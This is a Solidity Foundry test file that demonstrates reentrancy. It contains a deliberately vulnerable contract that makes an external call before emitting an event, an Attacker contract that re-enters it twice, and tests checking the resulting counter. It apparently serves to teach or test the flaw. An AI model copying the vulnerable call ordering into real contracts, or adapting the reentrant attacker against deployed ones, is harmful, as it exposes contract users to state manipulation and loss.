// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import Foundry's standard testing library
import "forge-std/Test.sol";

// Vulnerable Contract as provided
interface ICalled {
    function f() external;
}

contract VulnerableContract {
    uint public counter;

    event Counter(uint counter);

    // Vulnerable function: state update, then external call, then event emit
    function bug(ICalled d) public {
        counter += 1;
        // Vulnerability: external call happens before event emit
        d.f();
        emit Counter(counter);
    }
}

// Attacker contract that exploits the vulnerability via reentrancy.
contract Attacker is ICalled {
    VulnerableContract public vulnerable;
    uint public attackCount;

    constructor(address _vulnerable) {
        vulnerable = VulnerableContract(_vulnerable);
    }

    // Attack entry: calls vulnerable.bug() with its own address
    function attack() public {
        vulnerable.bug(this);
    }

    // Callback from VulnerableContract. Reentrant call conditionally executed.
    function f() external override {
        if (attackCount < 2) { // limit recursion depth
            attackCount++;
            vulnerable.bug(this);
        }
    }
}

// A dummy contract that simply implements ICalled without reentrancy, to compare expected behavior
contract Innocent is ICalled {
    function f() external override { /* do nothing */ }
}

// Forge test contract
contract VulnerableContractTest is Test {
    VulnerableContract vulnerable;
    Attacker attacker;
    Innocent innocent;

    function setUp() public {
        vulnerable = new VulnerableContract();
        attacker = new Attacker(address(vulnerable));
        innocent = new Innocent();
    }

    // Test the vulnerability via reentrancy attack
    function testReentrancyAttack() public {
        // When attacker.attack() is called, due to reentrancy, bug() is executed thrice
        // Expected counter: normally, a single call to bug() would increment counter to 1; with reentrancy, it becomes 3
        attacker.attack();
        uint finalCounter = vulnerable.counter();
        // The expected value is 3 because: initial call (counter=1) then two recursive reentrant calls (counter==2 and counter==3)
        assertEq(finalCounter, 3, "Counter should be 3 after reentrancy attack");
    }

    // Ensure that calling bug() with a non-reentrant contract behaves as expected
    function testInnocentCall() public {
        // Call bug() with an innocent contract that does nothing in f()
        vulnerable.bug(ICalled(address(innocent)));
        // Without reentrancy the counter should only be incremented by 1
        uint finalCounter = vulnerable.counter();
        assertEq(finalCounter, 1, "Counter should be 1 with a non-reentrant call");
    }

    // Optionally: test that multiple independent non-reentrant calls accumulate correctly
    function testMultipleNonReentrantCalls() public {
        // Call bug using innocent, multiple times
        for (uint i = 0; i < 5; i++) {
            vulnerable.bug(ICalled(address(innocent)));
        }
        uint finalCounter = vulnerable.counter();
        // No reentrancy should occur, so counter should equal number of calls (5)
        assertEq(finalCounter, 5, "Counter should equal the number of non-reentrant calls");
    }

    // Demonstrate that the unexpected state is due to unsafe external calls prior to event emission
    function testStateAnomalyDueToReentrancy() public {
        // The attacker leverages reentrancy to change the system state unexpectedly
        attacker.attack();

        // After the attack, check that the counter is not what a single call would yield
        // If bug() were safe, a single call would yield counter==1
        uint singleCallCounter = 1;
        uint actualCounter = vulnerable.counter();
        assertTrue(actualCounter != singleCallCounter, "Counter should not be 1 after reentrancy attack");
    }
}
